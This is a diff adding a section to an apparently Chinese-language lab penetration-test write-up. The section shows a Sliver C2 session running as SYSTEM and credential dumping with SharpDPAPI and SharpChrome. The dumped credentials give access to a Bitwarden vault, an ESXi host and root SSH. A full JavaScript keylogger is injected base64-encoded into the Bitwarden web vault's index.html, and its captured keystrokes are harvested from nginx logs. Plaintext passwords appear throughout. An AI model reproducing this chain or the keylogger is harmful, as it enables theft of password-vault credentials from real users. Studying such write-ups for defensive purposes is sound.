@@ -815,3 +815,295 @@ S021W105 172.16.21.140
 PS:S021M010 的System晚点在获取
 ```
 
+---
+
+
+## <span style="color:lightblue">Browser Credentials & Playing with Bitwarden</span>
+
+```bash
+[server] sliver (wutai-http) > info
+
+        Session ID: b5fc3a22-b5bb-4aef-a624-5dcb505643ca
+              Name: wutai-http
+          Hostname: S021W105
+              UUID: b3614d56-27fd-80c6-89fe-f7e7d62aea96
+          Username: NT AUTHORITY\SYSTEM
+               UID: S-1-5-18
+               GID: S-1-5-18
+               PID: 8080
+                OS: windows
+           Version: 10 build 19045 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: https://10.8.0.227?driver=wininet
+    Remote Address: 172.16.20.2:52862
+         Proxy URL:
+Reconnect Interval: 1m0s
+     First Contact: Fri Nov  3 16:40:43 EDT 2023 (13m30s ago)
+      Last Checkin: Fri Nov  3 16:54:12 EDT 2023 (1s ago)
+```
+
+sharpdpapi
+```
+[server] sliver (wutai-http) > sharpdpapi -s -- machinetriage
+
+[*] Triaging System Credentials
+
+
+Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile           : 0A5F8F2A8901A4C0CA2122488819BACB
+
+    guidMasterKey    : {3a265f00-cb47-4b68-9483-c4763064b338}
+    size             : 576
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 4/4/2023 8:44:18 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{91F9A551-5750-44B2-B185-E9EB23AC2108}
+    TargetAlias      :
+    Comment          :
+    UserName         : WORK-JUNON\carly.adams
+    Credential       : ZMskoMXML_qC17
+```
+
+```
+TaskScheduler
+UserName         : WORK-JUNON\carly.adams
+Credential       : ZMskoMXML_qC17
+```
+
+```
+bloodhound nothing
+```
+
+sharpchrome
+```
+切换到carly.adams用户session
+
+[server] sliver (wutai-http) > whoami
+
+Logon ID: WORK-JUNON\carly.adams
+[*] Current Token ID: WORK-JUNON\carly.adams
+
+[server] sliver (wutai-http) > sharpchrome -s -- logins /browser:edge
+
+---  Credential (Path: C:\Users\Carly.Adams\AppData\Local\Microsoft\Edge\User Data\Default\Login Data) ---
+
+file_path,signon_realm,origin_url,date_created,times_used,username,password
+C:\Users\Carly.Adams\AppData\Local\Microsoft\Edge\User Data\Default\Login Data,https://s021v010/,https://s021v010/,3/26/2023 12:57:53 PM,13324334273603338,carly.adams@junon.vl,c4rlyr0cks!!
+
+
+https://s021v010/
+carly.adams@junon.vl,c4rlyr0cks!!
+```
+
+```
+C:\Windows\Tasks>ping s021v010
+
+Pinging s021v010.work.junon.vl [172.16.21.240] with 32 bytes of data:
+```
+
+```
+https://172.16.21.240/#/login
+
+使用获取到的凭据登录
+
+Bitwarden是一款自由且开源的密码管理服务，用户可在加密的保管库中存储敏感信息
+```
+
+```
+获取到了ESXI的相关凭据
+
+root
+7d3XHR8uTgg2aB
+```
+
+```
+https://172.16.21.120/ui/#/login
+
+root
+7d3XHR8uTgg2aB
+
+只有一台虚拟机
+
+S021V010
+Ubuntu Linux (64-bit) 
+172.16.21.240
+
+Bitwarden的生产服务器
+
+Notes处泄漏机器相关凭据信息
+
+Root: kLVy28KH6X
+```
+
+SSH Login S021V010
+
+```
+proxychains4 -q ssh root@172.16.21.240
+
+root@s021v010:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@s021v010:~# whoami
+root
+
+root@s021v010:~# ss -lnt
+```
+
+```
+root@s021v010:~# docker ps
+CONTAINER ID   IMAGE                              COMMAND            CREATED        STATUS                  PORTS                                                                                    NAMES
+5cc679b084c0   bitwarden/nginx:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   80/tcp, 0.0.0.0:80->8080/tcp, :::80->8080/tcp, 0.0.0.0:443->8443/tcp, :::443->8443/tcp   bitwarden-nginx
+8b11acc65796   bitwarden/admin:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-admin
+44228b2d8f53   bitwarden/mssql:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-mssql
+79d6d6bbc52a   bitwarden/attachments:2023.3.0     "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-attachments
+a18d2d46b7f9   bitwarden/web:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-web
+0b324073a17e   bitwarden/notifications:2023.3.0   "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-notifications
+230355d545c1   bitwarden/events:2023.3.0          "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-events
+efe6bf763230   bitwarden/api:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-api
+9940eceddf5d   bitwarden/identity:2023.3.0        "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-identity
+1e0b25c93d14   bitwarden/icons:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-icons
+d627147599ac   bitwarden/sso:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-sso
+```
+
+```
+root@s021v010:~# docker exec -it bitwarden-web /bin/bash
+
+向index.html加入下面js代码
+
+键盘记录器
+```
+
+```js
+var keys='';
+var url = 'bitwarden-info.gif?c=';
+
+document.onkeypress = function(e) {
+    get = window.event?event:e;
+    key = get.keyCode?get.keyCode:get.charCode;
+    key = String.fromCharCode(key);
+    keys+=key;
+}
+window.setInterval(function(){
+    if(keys.length>0){
+        new Image().src = url+keys;
+        keys = '';
+    }
+}, 5000);
+```
+
+to base64 encode
+```
+dmFyIGtleXM9Jyc7CnZhciB1cmwgPSAnYml0d2FyZGVuLWluZm8uZ2lmP2M9JzsKCmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbihlKSB7CiAgICBnZXQgPSB3aW5kb3cuZXZlbnQ/ZXZlbnQ6ZTsKICAgIGtleSA9IGdldC5rZXlDb2RlP2dldC5rZXlDb2RlOmdldC5jaGFyQ29kZTsKICAgIGtleSA9IFN0cmluZy5mcm9tQ2hhckNvZGUoa2V5KTsKICAgIGtleXMrPWtleTsKfQp3aW5kb3cuc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKICAgIGlmKGtleXMubGVuZ3RoPjApewogICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCtrZXlzOwogICAgICAgIGtleXMgPSAnJzsKICAgIH0KfSwgNTAwMCk7
+```
+
+```
+root@a18d2d46b7f9:/app# echo -ne "dmFyIGtleXM9Jyc7CnZhciB1cmwgPSAnYml0d2FyZGVuLWluZm8uZ2lmP2M9JzsKCmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbihlKSB7CiAgICBnZXQgPSB3aW5kb3cuZXZlbnQ/ZXZlbnQ6ZTsKICAgIGtleSA9IGdldC5rZXlDb2RlP2dldC5rZXlDb2RlOmdldC5jaGFyQ29kZTsKICAgIGtleSA9IFN0cmluZy5mcm9tQ2hhckNvZGUoa2V5KTsKICAgIGtleXMrPWtleTsKfQp3aW5kb3cuc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXsKICAgIGlmKGtleXMubGVuZ3RoPjApewogICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCtrZXlzOwogICAgICAgIGtleXMgPSAnJzsKICAgIH0KfSwgNTAwMCk7" | base64 -d > log.js
+root@a18d2d46b7f9:/app# cat log.js
+var keys='';
+var url = 'bitwarden-info.gif?c=';
+
+document.onkeypress = function(e) {
+    get = window.event?event:e;
+    key = get.keyCode?get.keyCode:get.charCode;
+    key = String.fromCharCode(key);
+    keys+=key;
+}
+window.setInterval(function(){
+    if(keys.length>0){
+        new Image().src = url+keys;
+        keys = '';
+    }
+}, 5000);
+```
+
+```html
+<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script></body></html>
+```
+
+```html
+<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script><script src="log.js"></script></body></html>
+```
+
+```bash
+root@s021v010:~# docker exec -it bitwarden-web /bin/bash
+root@a18d2d46b7f9:/app# echo -ne "PCFkb2N0eXBlIGh0bWw+PGh0bWwgY2xhc3M9InRoZW1lX2xpZ2h0Ij48aGVhZD48bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD0xMDEwIi8+PG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiMxNzVEREMiLz48dGl0bGUgcGFnZS10aXRsZT5CaXR3YXJkZW4gV2ViIFZhdWx0PC90aXRsZT48bGluayByZWw9ImFwcGxlLXRvdWNoLWljb24iIHNpemVzPSIxODB4MTgwIiBocmVmPSJpbWFnZXMvYXBwbGUtdG91Y2gtaWNvbi5wbmciLz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgc2l6ZXM9IjMyeDMyIiBocmVmPSJpbWFnZXMvZmF2aWNvbi0zMngzMi5wbmciLz48bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3BuZyIgc2l6ZXM9IjE2eDE2IiBocmVmPSJpbWFnZXMvZmF2aWNvbi0xNngxNi5wbmciLz48bGluayByZWw9Im1hc2staWNvbiIgaHJlZj0iaW1hZ2VzL3NhZmFyaS1waW5uZWQtdGFiLnN2ZyIgY29sb3I9IiMxNzVEREMiLz48bGluayByZWw9Im1hbmlmZXN0IiBocmVmPSI3MDUwMWM5N2IzM2RmOTVhZGIzMi5qc29uIi8+PHNjcmlwdCBkZWZlcj0iZGVmZXIiIHNyYz0idGhlbWVfaGVhZC41ZjI0YmE4ZDdhYTk0NGU2ZjUyYi5qcyI+PC9zY3JpcHQ+PGxpbmsgaHJlZj0iYXBwL21haW4uNDUwMDA0ZmY0Nzg0YTc1ZDczNDAuY3NzIiByZWw9InN0eWxlc2hlZXQiPjwvaGVhZD48Ym9keSBjbGFzcz0ibGF5b3V0X2Zyb250ZW5kIj48YXBwLXJvb3Q+PGRpdiBjbGFzcz0ibXQtNSBkLWZsZXgganVzdGlmeS1jb250ZW50LWNlbnRlciI+PGRpdj48aW1nIGNsYXNzPSJtYi00IGxvZ28gbG9nby10aGVtZWQiIGFsdD0iQml0d2FyZGVuIi8+PHAgY2xhc3M9InRleHQtY2VudGVyIj48aSBjbGFzcz0iYndpIGJ3aS1zcGlubmVyIGJ3aS1zcGluIGJ3aS0yeCB0ZXh0LW11dGVkIiB0aXRsZT0iTG9hZGluZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L3A+PC9kaXY+PC9kaXY+PC9hcHAtcm9vdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvcG9seWZpbGxzLjQyOGMyNTYzODg0MDMzM2EwOWVlLmpzIj48L3NjcmlwdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvdmVuZG9yLmQ5NTM0NzRjZjNiZGIxMTBiNDY0LmpzIj48L3NjcmlwdD48c2NyaXB0IGRlZmVyPSJkZWZlciIgc3JjPSJhcHAvbWFpbi5kNDBhNGJmOTMxMjJlMjcxN2RjZS5qcyI+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9ImxvZy5qcyI+PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=" |base64 -d > index.html
+root@a18d2d46b7f9:/app# cat index.html
+<!doctype html><html class="theme_light"><head><meta charset="utf-8"/><meta name="viewport" content="width=1010"/><meta name="theme-color" content="#175DDC"/><title page-title>Bitwarden Web Vault</title><link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/><link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#175DDC"/><link rel="manifest" href="70501c97b33df95adb32.json"/><script defer="defer" src="theme_head.5f24ba8d7aa944e6f52b.js"></script><link href="app/main.450004ff4784a75d7340.css" rel="stylesheet"></head><body class="layout_frontend"><app-root><div class="mt-5 d-flex justify-content-center"><div><img class="mb-4 logo logo-themed" alt="Bitwarden"/><p class="text-center"><i class="bwi bwi-spinner bwi-spin bwi-2x text-muted" title="Loading" aria-hidden="true"></i></p></div></div></app-root><script defer="defer" src="app/polyfills.428c25638840333a09ee.js"></script><script defer="defer" src="app/vendor.d953474cf3bdb110b464.js"></script><script defer="defer" src="app/main.d40a4bf93122e2717dce.js"></script><script src="log.js"></script></body></html>
+```
+
+```bash
+有用户访问Bitwarden Web,最终log会被记录到nginx日志中
+
+root@s021v010:~# docker ps
+CONTAINER ID   IMAGE                              COMMAND            CREATED        STATUS                  PORTS                                                                                    NAMES
+5cc679b084c0   bitwarden/nginx:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   80/tcp, 0.0.0.0:80->8080/tcp, :::80->8080/tcp, 0.0.0.0:443->8443/tcp, :::443->8443/tcp   bitwarden-nginx
+8b11acc65796   bitwarden/admin:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-admin
+44228b2d8f53   bitwarden/mssql:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-mssql
+79d6d6bbc52a   bitwarden/attachments:2023.3.0     "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-attachments
+a18d2d46b7f9   bitwarden/web:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)                                                                                            bitwarden-web
+0b324073a17e   bitwarden/notifications:2023.3.0   "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-notifications
+230355d545c1   bitwarden/events:2023.3.0          "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-events
+efe6bf763230   bitwarden/api:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-api
+9940eceddf5d   bitwarden/identity:2023.3.0        "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-identity
+1e0b25c93d14   bitwarden/icons:2023.3.0           "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-icons
+d627147599ac   bitwarden/sso:2023.3.0             "/entrypoint.sh"   7 months ago   Up 15 hours (healthy)   5000/tcp                                                                                 bitwarden-sso
+root@s021v010:~# docker exec -it bitwarden-nginx /bin/bash
+root@5cc679b084c0:/# ls
+bin  boot  dev	docker-entrypoint.d  docker-entrypoint.sh  entrypoint.sh  etc  home  lib  lib64  logrotate.sh  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
+root@5cc679b084c0:/# cd /var/log/nginx/
+root@5cc679b084c0:/var/log/nginx# tail -f access.log | grep bitwarden-info.gif
+```
+
+```bash
+root@s021v010:~# docker exec -it bitwarden-nginx /bin/bash
+root@5cc679b084c0:/# cd /var/log/nginx/
+root@5cc679b084c0:/var/log/nginx# tail -f access.log | grep bitwarden-info.gif
+172.16.21.200 - - [03/Nov/2023:21:58:09 +0000] "GET /bitwarden-info.gif?c=fiona.stewart@junon.vlJunon2023!Bitwarden HTTP/2.0" 404 0 "https://s021v010/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5614.0 Safari/537.36" "-"
+```
+
+```
+fiona.stewart@junon.vl
+Junon2023!Bitwarden
+
+
+fiona.stewart
+nothing
+but
+
+此用户貌似有多个账户
+
+不同的权限级别
+分层模型
+
+
+```
+![](/assets/post_img/2023-11-04%20055415_Wutai_stewart.png)
+
+```
+但是我们没有获取到stewart的域凭据信息
+
+但是我们获得了她的bitwarden登录凭据
+```
+
+```
+HD-FSTEWART@WORK.JUNON.VL
+ACCOUNT OPERATORS@WORK.JUNON.VL
+
+DEQ8mC2xxTzVNB
+```
+
+```
+The user HD-FSTEWART@WORK.JUNON.VL is a member of the group ACCOUNT OPERATORS@WORK.JUNON.VL.
+
+Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.
+
+ACCOUNT OPERATORS
+```
+
+---
+
+## <span style="color:lightblue">Account Operators, Trust Enumeration & Password Reuse</span>
+
